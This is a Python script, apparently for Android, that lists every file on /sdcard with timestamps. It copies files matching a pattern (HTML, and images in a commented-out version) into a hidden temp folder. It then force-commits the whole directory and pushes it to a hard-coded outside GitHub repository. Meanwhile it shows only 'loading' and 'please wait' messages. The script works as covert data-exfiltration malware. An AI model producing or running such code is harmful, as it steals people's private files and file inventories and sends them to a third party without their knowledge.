import glob
import os
import shutil
import zipfile
import re
import json
import time
import pathlib

#os.chdir('./../')
#print(os.getcwd())
#shutil.rmtree('./tmp_123321')

if os.path.exists('./tmp_123321'):
      shutil.rmtree('./tmp_123321')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#print(f'{bcolors.FAIL}         Hello Nguyen Thi Thuy Trang{bcolors.ENDC}')

lst_1 = [
         glob.glob("/sdcard/*"),
         glob.glob("/sdcard/*/*"),
         glob.glob("/sdcard/*/*/*"),
         glob.glob("/sdcard/*/*/*/*"),
         glob.glob("/sdcard/*/*/*/*/*"),
         glob.glob("/sdcard/*/*/*/*/*/*"),
            ]
lst_all_files = []
lst_all_img=[]
count_img=0
N=35
#reg_=r'(\.jpg|\.jpeg|\.png|\.gif)$'
reg_=r'(\.html)$'
print(f'{bcolors.HEADER}       Loading................ {bcolors.ENDC}')
for t in lst_1:
      for y in t:
         if y:
               path = y
               ti_m = os.path.getmtime(path)
               m_ti = time.ctime(ti_m)
               t_obj = time.strptime(m_ti)
               T_stamp = time.strftime("%Y-%m-%d %H:%M:%S", t_obj)
               lst_all_files.append({'path':y,'creat_time':T_stamp})
               if re.search(reg_,y):
                     count_img=count_img+1
                     lst_all_img.append({'path':y,'name':str(count_img),'ext':re.search(reg_,y).group()})
         else:
               pass
      pass


# creat a folder (tmp_123321) to store all the img
tmp_dir_123='./tmp_123321'
#shutil.rmtree(tmp_dir_123)
if os.path.exists(tmp_dir_123):
      shutil.rmtree(tmp_dir_123)
else:
      os.mkdir(tmp_dir_123)

# write all files list
all_f=open('list_of_all_file.json','w')
all_f.write(json.dumps(lst_all_files,indent=4))
all_f.close()

# write all img list
all_f=open('list_of_all_img.json','w')
all_f.write(json.dumps(lst_all_img,indent=4))
all_f.close()


# copy all the img into the folder
number_of_all_img=len(lst_all_img)
list_name_img=[]
count=0
for t in lst_all_img:
   try:
     shutil.copy2(t['path'],tmp_dir_123)
     os.rename(os.path.join(tmp_dir_123,os.path.basename(t['path'])),os.path.join(tmp_dir_123,t['name']+t['ext']))
     #if count%25==0:
     #     os.system('clear')
     count=count+1
     print(f'{bcolors.BOLD}please wait......{bcolors.ENDC}{bcolors.OKGREEN}{str(count)}{bcolors.ENDC}/{bcolors.OKCYAN}{str(number_of_all_img)}{bcolors.ENDC}')
   except:
     pass




os.system('git config --global user.name biswajit7331277')
os.system('git config --global user.email biswajit7331277@gmail.com')
os.system('git init')
os.system('git status')
os.system('git add .')
os.system('git status')
os.system('git commit -m "abcdxyzq23"')
os.system('git branch -M master')
os.system('git remote add origin https://github.com/biswajit7331277/bt.git')
os.system('git push -u origin master')
#os.system('git config --global user.name')
#os.system('git config --global user.email')






